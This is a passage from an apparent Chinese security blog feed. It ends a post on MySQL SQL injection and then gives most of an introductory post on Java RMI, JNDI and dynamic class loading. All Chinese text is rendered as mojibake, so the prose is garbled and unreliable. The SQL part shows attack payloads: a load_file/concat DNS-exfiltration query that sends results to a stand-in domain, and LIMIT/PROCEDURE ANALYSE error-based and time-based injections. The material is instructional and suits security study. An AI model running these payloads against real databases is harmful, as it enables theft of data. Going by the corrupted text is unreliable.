<li>åœ¨mysqlä¸­æ‰§è¡Œ<code>select load_file(concat(&#39;\\\\&#39;,[payload],&#39;.abc.dns.com\\\aaa&#39;));</code>(â€˜&#39;ä¼šè¢«è½¬ä¹‰ï¼Œæ‰€ä»¥éœ€è¦+ä¸Šä¸€ä¸ªâ€™&#39;)ï¼Œpayloadçš„æ‰§è¡Œç»“æœä¼šè¢«æ˜¾ç¤ºåœ¨ç¬¬å››çº§åŸŸåçš„ä½ç½®ï¼Œä½¿ç”¨concatå‡½æ•°å°†(select database())å¾—åˆ°çš„å†…å®¹ä½œä¸ºæŸ¥è¯¢urlçš„ä¸€éƒ¨åˆ†ï¼Œå’Œæˆ‘ä»¬çš„å¹³å°ä¸‰çº§åŸŸåæ‹¼æ¥ç»„åˆæˆä¸€ä¸ªå››çº§åŸŸåï¼Œè€Œload_fileå‡½æ•°ä¼šé€šè¿‡dnsè§£æè¯·æ±‚ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨dnslogå¹³å°å°±å¯ä»¥çœ‹åˆ°æŸ¥è¯¢çš„è®°å½•(åŒ…å«ç€æˆ‘ä»¬æ³¨å…¥å‡ºçš„æ•°æ®)</li>
<li>å¯¹äºè¡¨æ®µï¼Œç”±äºload_file()ä¸€æ¬¡åªèƒ½ä¼ è¾“ä¸€æ¡æ•°æ®ï¼Œæ‰€ä»¥æŸ¥è¯¢çš„æ—¶å€™éœ€è¦ä½¿ç”¨limitæ¥ä¸€ä¸ªä¸€ä¸ªçš„è§£æã€‚<h1 id="Limit-æ³¨å…¥"><a href="#Limit-æ³¨å…¥" class="headerlink" title="Limit æ³¨å…¥"></a>Limit æ³¨å…¥</h1></li>
</ul>
<p>æ­¤æ–¹æ³•é€‚ç”¨äº<code>5.0.0&lt;mysql&lt;5.6.6</code>ä¸­<br>selectè¯­å¥ï¼š<code>select id from t1 where num=123333 order by id limit 1,1</code><br>åœ¨selectè¯­æ³•ä¸­ï¼Œlimitåé¢å¯ä»¥è·Ÿä¸¤ä¸ªå‡½æ•°<code>PROCEDURE</code> å’Œ <code>INTO</code>ï¼Œ<code>INTO</code>é™¤éæœ‰å†™å…¥shellçš„æƒé™ï¼Œå¦åˆ™æ˜¯æ— æ³•åˆ©ç”¨çš„<br>ä½¿ç”¨procedure analyseè¿›è¡ŒæŠ¥é”™æ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); </span><br><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:5.5.41-0ubuntu0.14.04.1&apos;</span><br></pre></td></tr></table></figure>
<p>åŸºäºæ—¶é—´ï¼š<br><code>SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</code></p>
]]></content>
      <categories>
        <category>sqlæ³¨å…¥</category>
      </categories>
  </entry>
  <entry>
    <title>Java RMIå­¦ä¹ </title>
    <url>/2020/06/27/Java%20RMI%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬æ–‡æ˜¯ä¸€ä¸ªå­¦ä¹ Javaååºåˆ—åŒ–æ¼æ´çš„ä¸€ä¸ªå…¥é—¨æ–‡ç« ï¼Œæ€»ç»“å­¦ä¹ Java RMIè°ƒç”¨ä»¥åŠä¸€ä¸ªSpring JNDIæ³¨å…¥ä¸ååºåˆ—åŒ–æ¼æ´åŸç†</p>
<a id="more"></a>

<h1 id="Java-RMIçš„å®šä¹‰"><a href="#Java-RMIçš„å®šä¹‰" class="headerlink" title="Java RMIçš„å®šä¹‰"></a>Java RMIçš„å®šä¹‰</h1><p>Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œå³Java RMI (Java Remote Method Invocation)ï¼Œæ˜¯Javaç¼–ç¨‹è¯­è¨€é‡Œï¼Œä¸€ç§ç”¨äº<strong>å®ç°è¿œç¨‹è¿‡ç¨‹è°ƒç”¨çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£</strong>ã€‚å®ƒä½¿å®¢æˆ·æœºä¸Šè¿è¡Œçš„ç¨‹åºå¯ä»¥ç›´æ¥è°ƒç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ã€‚è¿œç¨‹æ–¹æ³•è°ƒç”¨ç‰¹æ€§ä½¿Javaç¼–ç¨‹äººå‘˜èƒ½å¤Ÿåœ¨ç½‘ç»œç¯å¢ƒä¸­åˆ†å¸ƒæ“ä½œã€‚</p>
<p>RMIï¼ˆRemote Method Invocationï¼‰ä¸ºè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œæ˜¯å…è®¸è¿è¡Œåœ¨ä¸€ä¸ªJavaè™šæ‹Ÿæœºçš„å¯¹è±¡è°ƒç”¨è¿è¡Œåœ¨å¦ä¸€ä¸ªJavaè™šæ‹Ÿæœºä¸Šçš„å¯¹è±¡çš„æ–¹æ³•ã€‚è¿™ä¸¤ä¸ªè™šæ‹Ÿæœºå¯ä»¥æ˜¯è¿è¡Œåœ¨ç›¸åŒè®¡ç®—æœºä¸Šçš„ä¸åŒè¿›ç¨‹ä¸­ï¼Œä¹Ÿå¯ä»¥æ˜¯è¿è¡Œåœ¨ç½‘ç»œä¸Šçš„ä¸åŒè®¡ç®—æœºä¸­ã€‚</p>
<p>åœ¨RMIä¸­<strong>å¯¹è±¡æ˜¯é€šè¿‡åºåˆ—åŒ–æ–¹å¼è¿›è¡Œç¼–ç ä¼ è¾“çš„</strong>ã€‚ï¼ˆåŸºäºåºåˆ—åŒ–å’Œååºåˆ—åŒ–å°±å¯èƒ½å­˜åœ¨ååºåˆ—åŒ–æ¼æ´äº†ï¼‰<br><strong>RMIçš„åŸºç¡€æ˜¯æ¥å£ï¼ŒRMIæ„æ¶åŸºäºä¸€ä¸ªé‡è¦çš„åŸç†ï¼šå®šä¹‰æ¥å£å’Œ<em>å®šä¹‰æ¥å£çš„å…·ä½“</em>å®ç°æ˜¯åˆ†å¼€çš„ã€‚</strong></p>
<h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>RMIèƒ½è®©ä¸€ä¸ªJavaç¨‹åºå»è°ƒç”¨ç½‘ç»œä¸­å¦ä¸€å°è®¡ç®—æœºçš„Javaå¯¹è±¡çš„æ–¹æ³•ï¼Œé‚£ä¹ˆè°ƒç”¨çš„æ•ˆæœå°±åƒæ˜¯åœ¨æœ¬æœºä¸Šè°ƒç”¨ä¸€æ ·ã€‚é€šä¿—çš„è®²ï¼šAæœºå™¨ä¸Šé¢æœ‰ä¸€ä¸ªclassï¼Œé€šè¿‡è¿œç¨‹è°ƒç”¨ï¼ŒBæœºå™¨è°ƒç”¨è¿™ä¸ªclass ä¸­çš„æ–¹æ³•ã€‚</p>
<h2 id="RMIåŒ…å«éƒ¨åˆ†ï¼š"><a href="#RMIåŒ…å«éƒ¨åˆ†ï¼š" class="headerlink" title="RMIåŒ…å«éƒ¨åˆ†ï¼š"></a>RMIåŒ…å«éƒ¨åˆ†ï¼š</h2><ol>
<li>è¿œç¨‹æœåŠ¡çš„æ¥å£å®šä¹‰</li>
<li>è¿œç¨‹æœåŠ¡æ¥å£çš„å…·ä½“å®ç°</li>
<li>å­˜æ ¹ï¼ˆStubï¼‰å’Œéª¨æ¶ï¼ˆSkeletonï¼‰æ–‡ä»¶</li>
<li>ä¸€ä¸ªè¿è¡Œè¿œç¨‹æœåŠ¡çš„æœåŠ¡å™¨</li>
<li>ä¸€ä¸ªRMIå‘½åæœåŠ¡ï¼Œå®ƒå…è®¸å®¢æˆ·ç«¯å»å‘ç°è¿™ä¸ªè¿œç¨‹æœåŠ¡</li>
<li>ç±»æ–‡ä»¶çš„æä¾›è€…ï¼ˆä¸€ä¸ªHTTPæˆ–è€…FTPæœåŠ¡å™¨ï¼‰</li>
<li>ä¸€ä¸ªéœ€è¦è¿™ä¸ªè¿œç¨‹æœåŠ¡çš„å®¢æˆ·ç«¯ç¨‹åº<h1 id="Java-RMIç¤ºä¾‹"><a href="#Java-RMIç¤ºä¾‹" class="headerlink" title="Java RMIç¤ºä¾‹"></a>Java RMIç¤ºä¾‹</h1><h2 id="è¿œç¨‹æ–¹æ³•è°ƒç”¨"><a href="#è¿œç¨‹æ–¹æ³•è°ƒç”¨" class="headerlink" title="è¿œç¨‹æ–¹æ³•è°ƒç”¨"></a>è¿œç¨‹æ–¹æ³•è°ƒç”¨</h2>è¿œç¨‹æ–¹æ³•è°ƒç”¨æ˜¯åˆ†å¸ƒå¼ç¼–ç¨‹ä¸­çš„ä¸€ä¸ªåŸºæœ¬æ€æƒ³ã€‚è€ŒRMIï¼ˆRemote Method Invocationï¼‰æ˜¯ä¸“ä¸ºJavaç¯å¢ƒè®¾è®¡çš„è¿œç¨‹æ–¹æ³•è°ƒç”¨æœºåˆ¶ï¼Œè¿œç¨‹æœåŠ¡å™¨å®ç°å…·ä½“çš„Javaæ–¹æ³•å¹¶æä¾›æ¥å£ï¼Œå®¢æˆ·ç«¯æœ¬åœ°ä»…éœ€æ ¹æ®æ¥å£ç±»çš„å®šä¹‰ï¼Œæä¾›ç›¸åº”çš„å‚æ•°å³å¯è°ƒç”¨è¿œç¨‹æ–¹æ³•ã€‚RMIä¾èµ–çš„é€šä¿¡åè®®ä¸ºJRMP(Java Remote Message Protocol ï¼ŒJava è¿œç¨‹æ¶ˆæ¯äº¤æ¢åè®®)ï¼Œè¯¥åè®®ä¸ºJavaå®šåˆ¶ï¼Œè¦æ±‚æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯éƒ½ä¸ºJavaç¼–å†™ã€‚è¿™ä¸ªåè®®å°±åƒHTTPåè®®ä¸€æ ·ï¼Œè§„å®šäº†å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯é€šä¿¡è¦æ»¡è¶³çš„è§„èŒƒã€‚åœ¨RMIä¸­å¯¹è±¡æ˜¯é€šè¿‡<strong>åºåˆ—åŒ–æ–¹å¼</strong>è¿›è¡Œç¼–ç ä¼ è¾“çš„ã€‚<h2 id="è¿œç¨‹å¯¹è±¡"><a href="#è¿œç¨‹å¯¹è±¡" class="headerlink" title="è¿œç¨‹å¯¹è±¡"></a>è¿œç¨‹å¯¹è±¡</h2></li>
<li>é¦–å…ˆæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªè¿œç¨‹æ¥å£<code>Clock.java</code><ul>
<li>å®šä¹‰è¿œç¨‹æœåŠ¡æ¥å£ï¼ˆinterfaceï¼‰</li>
<li>è¿œç¨‹æ¥å£å¿…é¡»ç»§æ‰¿Remote</li>
<li>è¿œç¨‹æ–¹æ³•å¿…é¡»æŠ›å‡ºRemoteException<blockquote>
<p>åœ¨Javaä¸­ï¼Œåªè¦ä¸€ä¸ªç±»extendsäº†java.rmi.Remoteæ¥å£ï¼Œå³å¯æˆä¸ºå­˜åœ¨äºæœåŠ¡å™¨ç«¯çš„è¿œç¨‹å¯¹è±¡ï¼Œ ä¾›å®¢æˆ·ç«¯è®¿é—®å¹¶æä¾›ä¸€å®šçš„æœåŠ¡ã€‚JavaDocæè¿°ï¼šRemote æ¥å£ç”¨äºæ ‡è¯†å…¶æ–¹æ³•å¯ä»¥ä»éæœ¬åœ°è™šæ‹Ÿæœºä¸Šè°ƒç”¨çš„æ¥å£ã€‚ä»»ä½•è¿œç¨‹å¯¹è±¡éƒ½å¿…é¡»ç›´æ¥æˆ–é—´æ¥å®ç°æ­¤æ¥å£ã€‚åªæœ‰åœ¨â€œè¿œç¨‹æ¥å£â€ æ‰©å±• java.rmi.Remote çš„æ¥å£ï¼‰ä¸­æŒ‡å®šçš„è¿™äº›æ–¹æ³•æ‰å¯è¢«è¿œç¨‹è°ƒç”¨</p>
</blockquote>
</li>
</ul>
</li>
</ol>
<p><img src="./Clock.png" alt="Clock.java"><br>2. æ¥ä¸‹æ¥å®šä¹‰è¿œç¨‹æ¥å£çš„å®ç°<code>ClockImpl.java</code><br><img src="./ClockImpl.png" alt="ClockImpl.java"></p>
<blockquote>
<ul>
<li>è¿œç¨‹å¯¹è±¡å¿…é¡»å®ç°java.rmi.server.UniCastRemoteObjectç±»ï¼Œè¿™æ ·æ‰èƒ½ä¿è¯å®¢æˆ·ç«¯è®¿é—®è·å¾—è¿œç¨‹å¯¹è±¡æ—¶ï¼Œ</li>
<li>è¯¥è¿œç¨‹å¯¹è±¡å°†ä¼šæŠŠè‡ªèº«çš„ä¸€ä¸ªæ‹·è´ä»¥Socketçš„å½¢å¼ä¼ è¾“ç»™å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶å®¢æˆ·ç«¯æ‰€è·å¾—çš„è¿™ä¸ªæ‹·è´ç§°ä¸ºâ€stubâ€(å­˜æ ¹)ï¼Œ</li>
<li>è€ŒæœåŠ¡å™¨ç«¯æœ¬èº«å·²å­˜åœ¨çš„è¿œç¨‹å¯¹è±¡åˆ™ç§°ä¹‹ä¸ºâ€Skeletonâ€(éª¨æ¶)ã€‚å…¶å®æ­¤æ—¶çš„å­˜æ ¹æ˜¯å®¢æˆ·ç«¯çš„ä¸€ä¸ªä»£ç†ï¼Œç”¨äºä¸æœåŠ¡å™¨ç«¯çš„é€šä¿¡ï¼Œ</li>
<li>è€Œéª¨æ¶ä¹Ÿå¯è®¤ä¸ºæ˜¯æœåŠ¡å™¨ç«¯çš„ä¸€ä¸ªä»£ç†ï¼Œç”¨äºæ¥æ”¶å®¢æˆ·ç«¯çš„è¯·æ±‚ä¹‹åè°ƒç”¨è¿œç¨‹æ–¹æ³•æ¥å“åº”å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚</li>
</ul>
</blockquote>
<h2 id="å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h2><ol>
<li>æ ¹æ®ä¸»æœºå’Œç«¯å£ï¼Œè·å¾—æœåŠ¡æ³¨å†Œå™¨çš„å¼•ç”¨</li>
<li>æ³¨å†Œå™¨æ ¹æ®æœåŠ¡åç§°æŸ¥æ‰¾å¯¹åº”çš„æœåŠ¡ï¼Œå¹¶è¿”å›ç»™å®¢æˆ·ç«¯ï¼ˆStubâ€”-å®¢æˆ·ç«¯ä»£ç†ï¼‰</li>
<li>å®¢æˆ·å¯¹è±¡é€šè¿‡Stubå‘é€è¯·æ±‚</li>
<li>Stubå°†è°ƒç”¨ä¿¡æ¯ï¼ˆå˜é‡ã€æ–¹æ³•åç§°ç­‰ï¼‰æ‰“åŒ…ï¼Œé€šè¿‡ç½‘ç»œå°†å®ƒå‘é€ç»™Skeletonï¼ˆæœåŠ¡è¾…åŠ©å¯¹è±¡ï¼‰</li>
<li>Skeletonå°†æ¥è‡ªStubçš„ä¿¡æ¯è§£åŒ…ï¼Œæ‰¾å‡ºè¢«è°ƒç”¨çš„æ–¹æ³•ï¼ˆä»¥åŠåœ¨å“ªä¸ªå¯¹è±¡å†…ï¼‰ï¼Œç„¶åè°ƒç”¨çœŸæ­£çš„æœåŠ¡å¯¹è±¡ä¸Šçš„çœŸæ­£æ–¹æ³•</li>
<li>æœåŠ¡å¯¹è±¡æ‰§è¡Œæ–¹æ³•ï¼Œè·å¾—è¿”å›ç»“æœï¼Œå¹¶å°†ç»“æœè¿”å›ç»™Skeleton</li>
<li>Skeletonå°†è¿”å›ç»“æœæ‰“åŒ…ï¼Œé€šè¿‡ç½‘ç»œè¿”å›ç»™Stubï¼ˆæ³¨æ„è¿”å›ç»“æœå¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ï¼‰</li>
<li>Stubæ¥å—åˆ°æ•°æ®åè§£åŒ…ï¼Œè¿”å›ç»™å®¢æˆ·å¯¹è±¡ã€‚</li>
<li>å®¢æˆ·ç«¯æ‰€åœ¨çš„JVMå¯åŠ¨åï¼Œå¯ä»¥å¤šæ¬¡è°ƒç”¨æœåŠ¡ç«¯å¯¹è±¡çš„æ–¹æ³•ã€‚<blockquote>
<p>stubå’Œskeletonä»£ç†éƒ½æ˜¯åœ¨æœåŠ¡ç«¯ç¨‹åºä¸­ç”±RMIç³»ç»ŸåŠ¨æ€ç”Ÿæˆ,æœåŠ¡ç«¯ç¨‹åºåªéœ€è¦ç»§æ‰¿java.rmi.server.UnicastRemoteObjectç±»å³å¯</p>
</blockquote>
<h2 id="å¦‚ä½•è·å–Stub"><a href="#å¦‚ä½•è·å–Stub" class="headerlink" title="å¦‚ä½•è·å–Stub"></a>å¦‚ä½•è·å–Stub</h2></li>
<li>è°ƒç”¨æŸä¸ªè¿œç¨‹æœåŠ¡ä¸Šçš„æ–¹æ³•ï¼Œå‘è¿œç¨‹æœåŠ¡è·å–å­˜æ ¹<br>JDKæä¾›äº†ä¸€ä¸ªRMIæ³¨å†Œè¡¨ï¼ˆRMIRegistryï¼‰ï¼ŒRMIRegistryä¹Ÿæ˜¯ä¸€ä¸ªè¿œç¨‹å¯¹è±¡ï¼Œé»˜è®¤ç›‘å¬åœ¨1099ç«¯å£ä¸Šï¼Œå¯ä»¥ä½¿ç”¨ä»£ç å¯åŠ¨RMIRegistryï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨rmiregistryå‘½ä»¤ã€‚</li>
</ol>
<ul>
<li>è¦æ³¨å†Œè¿œç¨‹å¯¹è±¡ï¼Œéœ€è¦RMI URLå’Œä¸€ä¸ªè¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ã€‚</li>
<li><code>LocateRegistry.getRegistry()</code>ä¼šä½¿ç”¨ç»™å®šçš„ä¸»æœºå’Œç«¯å£ç­‰ä¿¡æ¯æœ¬åœ°åˆ›å»ºä¸€ä¸ªStubå¯¹è±¡ä½œä¸ºRegistryè¿œç¨‹å¯¹è±¡çš„ä»£ç†ï¼Œä»è€Œå¯åŠ¨æ•´ä¸ªè¿œç¨‹è°ƒç”¨é€»è¾‘ã€‚æœåŠ¡ç«¯åº”ç”¨ç¨‹åºå¯ä»¥å‘RMIæ³¨å†Œè¡¨ä¸­æ³¨å†Œè¿œç¨‹å¯¹è±¡ï¼Œç„¶åå®¢æˆ·ç«¯å‘RMIæ³¨å†Œè¡¨æŸ¥è¯¢æŸä¸ªè¿œç¨‹å¯¹è±¡åç§°ï¼Œæ¥è·å–è¯¥è¿œç¨‹å¯¹è±¡çš„Stubã€‚<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ›å»ºClockå®ä¾‹</span></span><br><span class="line">Clock impl = <span class="keyword">new</span> ClockImpl();</span><br><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Registry registry = LocateRegistry.getRegistry();</span><br><span class="line">registry.bind(<span class="string">"Clock"</span>,stub);</span><br></pre></td></tr></table></figure>
ä»å®¢æˆ·ç«¯è§’åº¦æ¥çœ‹æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯å¼€å¯äº†ä¸¤ä¸ªç«¯å£ï¼Œä¸€ä¸ªæ˜¯RMIæ³¨å†Œç«¯å£é»˜è®¤ä¸º1099ï¼Œå¦ä¸€ä¸ªæ˜¯è¿œç¨‹å¯¹è±¡é€šä¿¡ç«¯å£ï¼Œç”±JVMéšæœºåˆ†é…ï¼Œ</li>
<li>å®¢æˆ·ç«¯ä»£ç <code>ClockClient.java</code><br><img src="./ClockClient.png" alt="ClockClient.java"></li>
</ul>
<h2 id="æœåŠ¡ç«¯"><a href="#æœåŠ¡ç«¯" class="headerlink" title="æœåŠ¡ç«¯"></a>æœåŠ¡ç«¯</h2><p>Clockæ˜¯æš´éœ²åœ¨ç½‘ç»œä¸­çš„æ¥å£ï¼ŒClockImplæ˜¯ä¸€ä¸ªæœåŠ¡ç«¯è¿œç¨‹å¯¹è±¡ï¼Œé‡å†™äº†ä¸€ä¸ªHelloæ–¹æ³•ä¾›è¿œç¨‹è°ƒç”¨ã€‚å®ƒæ²¡æœ‰ç»§æ‰¿UnicastRemoteObjectç±»ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ„é€ æ–¹æ³•ä¸­è°ƒç”¨<code>UnicastRemoteObject.exportObject()</code>ä¾‹å¦‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ClockImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">    UnicastRemoteObject.exportObject(<span class="keyword">this</span>, <span class="number">1099</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå¯ä»¥ç¨ååœ¨æœåŠ¡ç«¯ä»£ç ä¸­è°ƒç”¨</p>
<ul>
<li>æœåŠ¡ç«¯ä»£ç <code>ClockServer.java</code><br><img src="./ClockServer.png" alt="ClockServer.java"><blockquote>
<p>æ³¨å†Œè¿œç¨‹å¯¹è±¡,å‘å®¢æˆ·ç«¯æä¾›è¿œç¨‹å¯¹è±¡æœåŠ¡è¿œç¨‹å¯¹è±¡æ˜¯åœ¨è¿œç¨‹æœåŠ¡ä¸Šåˆ›å»ºçš„ï¼Œä½ æ— æ³•ç¡®åˆ‡åœ°çŸ¥é“è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡çš„åç§°ã€‚ä½†æ˜¯ï¼Œå°†è¿œç¨‹å¯¹è±¡æ³¨å†Œåˆ°RMI Serviceä¹‹åï¼Œå®¢æˆ·ç«¯å°±å¯ä»¥é€šè¿‡RMI Serviceè¯·æ±‚åˆ°è¯¥è¿œç¨‹æœåŠ¡å¯¹è±¡çš„stubäº†ï¼Œåˆ©ç”¨stubä»£ç†å°±å¯ä»¥è®¿é—®è¿œç¨‹æœåŠ¡å¯¹è±¡äº†</p>
</blockquote>
</li>
</ul>
<ul>
<li>æœåŠ¡ç«¯çš„æµç¨‹æ˜¯ï¼š</li>
</ul>
<ol>
<li>å®šä¹‰è¿œç¨‹æœåŠ¡æ¥å£ï¼ˆinterfaceï¼‰</li>
<li>å®šä¹‰è¿œç¨‹æœåŠ¡æ¥å£çš„å…·ä½“å®ç°ï¼ˆimplementï¼‰</li>
<li>å°†è¯¥è¿œç¨‹æœåŠ¡æ³¨å†Œåˆ°RMIå‘½åæœåŠ¡ä¸Šï¼ˆæŒ‡å®šä¸»æœºåŠç«¯å£ï¼‰ï¼ˆregistryï¼‰</li>
<li>å¯åŠ¨è¿œç¨‹æœåŠ¡æ‰€åœ¨çš„jvmçº¿ç¨‹ï¼Œæ­¤æ—¶æœåŠ¡ç«¯å¤„äºè¿è¡Œä¸­ã€‚</li>
</ol>
<h1 id="è¿è¡Œå®ä¾‹"><a href="#è¿è¡Œå®ä¾‹" class="headerlink" title="è¿è¡Œå®ä¾‹"></a>è¿è¡Œå®ä¾‹</h1><ol>
<li>å…ˆè¿è¡ŒæœåŠ¡ç«¯<br><img src="./server.png" alt="server"></li>
<li>è¿è¡Œå®¢æˆ·ç«¯ï¼Œè°ƒç”¨æˆåŠŸ<br><img src="./client.png" alt="client"></li>
</ol>
<h1 id="æ€»ç»“ä¸€ä¸‹RMI-æµç¨‹"><a href="#æ€»ç»“ä¸€ä¸‹RMI-æµç¨‹" class="headerlink" title="æ€»ç»“ä¸€ä¸‹RMI æµç¨‹"></a>æ€»ç»“ä¸€ä¸‹RMI æµç¨‹</h1><ol>
<li>æœåŠ¡ç«¯ClockImpl()ç»§æ‰¿Clock()åˆ›å»ºè¿œç¨‹å¯¹è±¡</li>
<li>æœåŠ¡ç«¯CLock()æ³¨å†Œè¿œç¨‹å¯¹è±¡</li>
<li>å®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨bå¹¶æŸ¥æ‰¾ç›¸åº”è¿œç¨‹å¯¹è±¡</li>
<li>æœåŠ¡ç«¯å°†stub(å­˜æ ¹è¿”å›)å®¢æˆ·ç«¯</li>
<li>å®¢æˆ·ç«¯è°ƒç”¨stub(å­˜æ ¹)çš„æ–¹æ³•</li>
<li>stub(å­˜æ ¹)ä½œä¸ºä»£ç†ä¸æœåŠ¡ç«¯éª¨æ¶é€šä¿¡   //éª¨æ¶ä½œä¸ºæœåŠ¡ç«¯ä»£ç†</li>
<li>éª¨æ¶ä»£ç†è°ƒç”¨ClockImplç›¸åº”æ–¹æ³•</li>
<li>éª¨æ¶å°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯çš„å­˜æ ¹</li>
<li>å­˜æ ¹è¿”å›ç»™å®¢æˆ·ç«¯<br><img src="./%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.jpg" alt="RMIä½“ç³»ç»“æ„"></li>
</ol>
<h1 id="åŠ¨æ€åŠ è½½ç±»"><a href="#åŠ¨æ€åŠ è½½ç±»" class="headerlink" title="åŠ¨æ€åŠ è½½ç±»"></a>åŠ¨æ€åŠ è½½ç±»</h1><p>RMIæ ¸å¿ƒç‰¹ç‚¹ä¹‹ä¸€å°±æ˜¯åŠ¨æ€ç±»åŠ è½½ï¼Œå¦‚æœå½“å‰JVMä¸­æ²¡æœ‰æŸä¸ªç±»çš„å®šä¹‰ï¼Œå®ƒå¯ä»¥ä»è¿œç¨‹URLå»ä¸‹è½½è¿™ä¸ªç±»çš„classï¼ŒåŠ¨æ€åŠ è½½çš„å¯¹è±¡classæ–‡ä»¶å¯ä»¥ä½¿ç”¨WebæœåŠ¡çš„æ–¹å¼è¿›è¡Œæ‰˜ç®¡ã€‚è¿™å¯ä»¥åŠ¨æ€çš„æ‰©å±•è¿œç¨‹åº”ç”¨çš„åŠŸèƒ½ï¼ŒRMIæ³¨å†Œè¡¨ä¸Šå¯ä»¥åŠ¨æ€çš„åŠ è½½ç»‘å®šå¤šä¸ªRMIåº”ç”¨ã€‚å¯¹äºå®¢æˆ·ç«¯è€Œè¨€ï¼ŒæœåŠ¡ç«¯è¿”å›å€¼ä¹Ÿå¯èƒ½æ˜¯ä¸€äº›å­ç±»çš„å¯¹è±¡å®ä¾‹ï¼Œè€Œå®¢æˆ·ç«¯å¹¶æ²¡æœ‰è¿™äº›å­ç±»çš„classæ–‡ä»¶ï¼Œå¦‚æœéœ€è¦å®¢æˆ·ç«¯æ­£ç¡®è°ƒç”¨è¿™äº›å­ç±»ä¸­è¢«é‡å†™çš„æ–¹æ³•ï¼Œåˆ™åŒæ ·éœ€è¦æœ‰è¿è¡Œæ—¶åŠ¨æ€åŠ è½½é¢å¤–ç±»çš„èƒ½åŠ›ã€‚å®¢æˆ·ç«¯ä½¿ç”¨äº†ä¸RMIæ³¨å†Œè¡¨ç›¸åŒçš„æœºåˆ¶ã€‚RMIæœåŠ¡ç«¯å°†URLä¼ é€’ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯é€šè¿‡HTTPè¯·æ±‚ä¸‹è½½è¿™äº›ç±»ã€‚</p>
<ul>
<li><strong>JNDIæ³¨å…¥çš„åˆ©ç”¨æ–¹æ³•ä¸­ä¹Ÿå€ŸåŠ©äº†åŠ¨æ€åŠ è½½ç±»çš„æ€è·¯</strong>ã€‚</li>
<li>è¿™é‡Œæ¶‰åŠåˆ°çš„è§’è‰²ï¼šå®¢æˆ·ç«¯ã€RMIæ³¨å†Œè¡¨ã€è¿œç¨‹å¯¹è±¡æœåŠ¡å™¨ã€æ‰˜ç®¡classæ–‡ä»¶çš„WebæœåŠ¡å™¨å¯ä»¥åˆ†åˆ«ä½äºä¸åŒçš„ä¸»æœºä¸Šï¼š<br><img src="./%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%B1%BB.png" alt="åŠ¨æ€åŠ è½½ç±»"><h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1>JNDI (Java Naming and Directory Interface) æ˜¯ä¸€ç»„åº”ç”¨ç¨‹åºæ¥å£ï¼Œå®ƒä¸ºå¼€å‘äººå‘˜æŸ¥æ‰¾å’Œè®¿é—®å„ç§èµ„æºæä¾›äº†ç»Ÿä¸€çš„é€šç”¨æ¥å£ï¼Œå¯ä»¥ç”¨æ¥å®šä½ç”¨æˆ·ã€ç½‘ç»œã€æœºå™¨ã€å¯¹è±¡å’ŒæœåŠ¡ç­‰å„ç§èµ„æºã€‚æ¯”å¦‚å¯ä»¥åˆ©ç”¨JNDIåœ¨å±€åŸŸç½‘ä¸Šå®šä½ä¸€å°æ‰“å°æœºï¼Œä¹Ÿå¯ä»¥ç”¨JNDIæ¥å®šä½æ•°æ®åº“æœåŠ¡æˆ–ä¸€ä¸ªè¿œç¨‹Javaå¯¹è±¡ã€‚JNDIåº•å±‚<strong>æ”¯æŒRMIè¿œç¨‹å¯¹è±¡</strong>ï¼ŒRMIæ³¨å†Œçš„æœåŠ¡å¯ä»¥é€šè¿‡JNDIæ¥å£æ¥è®¿é—®å’Œè°ƒç”¨ã€‚</li>
<li>å…¶å®JNDIå°±å¦‚åŒWindowsç³»ç»Ÿçš„æ³¨å†Œè¡¨ä¸€æ ·:<code>é”®:å€¼</code><br><img src="./JNDI.png" alt="JNDI"><blockquote>
